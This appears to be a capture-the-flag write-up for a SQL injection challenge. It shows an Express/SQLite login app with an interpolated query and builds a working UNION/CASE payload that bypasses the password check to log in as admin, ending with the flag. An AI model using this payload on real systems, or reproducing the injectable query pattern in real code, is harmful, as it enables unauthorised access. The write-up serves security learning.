# Injection Perfection - SQLI

We are given credentials,
- username: joe
- password: bruin

as well as the source

```js
const express = require('express');
const path = require('path');

const multer = require('multer');
const bodyParser = require('body-parser');

const port = parseInt(process.env.PORT) || 8080;

const sqlite3 = require('sqlite3');
const db = new sqlite3.Database('app.db', sqlite3.OPEN_READONLY);

const app = express();
const upload = multer();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(upload.array());
app.use(express.static('public'));

const getFavColor = async (username) => {
	return new Promise((resolve, reject) => {
		db.get('SELECT fav_color FROM users WHERE username=?', username, (err, row) => {
			if (err) return resolve(err);
			return resolve(row.fav_color);
		});
	});
};

const attemptLogin = (username, password) => {
	return new Promise((resolve, reject) => {
		db.get(`SELECT username, password FROM users WHERE username='${username}'`, async (err, row) => {
			if (err)
				return reject(err);
			else if (row === undefined)
				return reject('Invalid User');
			else if (password === row.password)
				return resolve(`My favorite color is ${await getFavColor(row.username)}`);
			else
				return reject('incorrect password');
		});
	})
};

app.get('/', (req, res) => {
	res.sendFile(path.join(__dirname, 'login.html'));
});

app.post('/', async (req, res) => {
	const username = req.body.username;
	const password = req.body.password;

	if (!username || !password)
		return res.status(400).send("Invalid Login");
	
	try {
		return res.status(200).send(await attemptLogin(username, password));
	} catch (err) {
		return res.status(400).send(err);
	}
});

app.get('*', (req, res) => {
	res.status(404).send('not found');
});

app.listen(port, () => {
	console.log(`Listening on port ${port}`);
});
```

Of course the section we are concerned with is 

```js
db.get(`SELECT username, password FROM users WHERE username='${username}'`, async (err, row) => {
			if (err)
				return reject(err);
			else if (row === undefined)
				return reject('Invalid User');
			else if (password === row.password)
				return resolve(`My favorite color is ${await getFavColor(row.username)}`);
			else
				return reject('incorrect password');
		});

```

We can see our username input gets injected into freely into the query 

`SELECT username, password FROM users WHERE username='${username}'`

The challenge with this problem is how it treats the login.
Instead of a usual 

`SELECT username, password FROM users WHERE username='${username}' AND password={password}`

The logic checks the valid password FROM the database result, and not in the sql query. Thus, it is a check we cannot avoid.

`else if (password === row.password)`

There are also no leaks of information as the only text output given is the fav_colour column upon a successful login.

```js
db.get('SELECT fav_color FROM users WHERE username=?', username, (err, row) => {
			if (err) return resolve(err);
			return resolve(row.fav_color);
		});
```

With this information, our best method of breaking the code is to somehow manipulate the result to give us a row that has the username admin and a password we manipulate.

Early attempts involved UNION, grabbing two query results and switching the ORDER of the queries

`joe' union select username, password from users where username='admin' ORDER BY 1 -- `

This of course will not work because the resulting sql output will still be a valid, untouched row from the database. 

Further research into manipulating sql output from a query led me to find the CASE syntax.

`SELECT id, name, CASE WHEN hide = 0 THEN 'false' ELSE 'true' END AS hide FROM anonymous_table`

This looked very promising but it requires us to still know the password, but then I researched if LIKE was compatible with it, and it was.

`CASE WHEN countries LIKE '%'+@selCountry+'%' THEN 'national' ELSE 'regional' END`

Last thing to do was construct our payload.

`joe' union select username, case when password like '%' then 'a' END as password from users where username='admin' -- `

flag{red_is_the_best_color_fight_me_you_wont}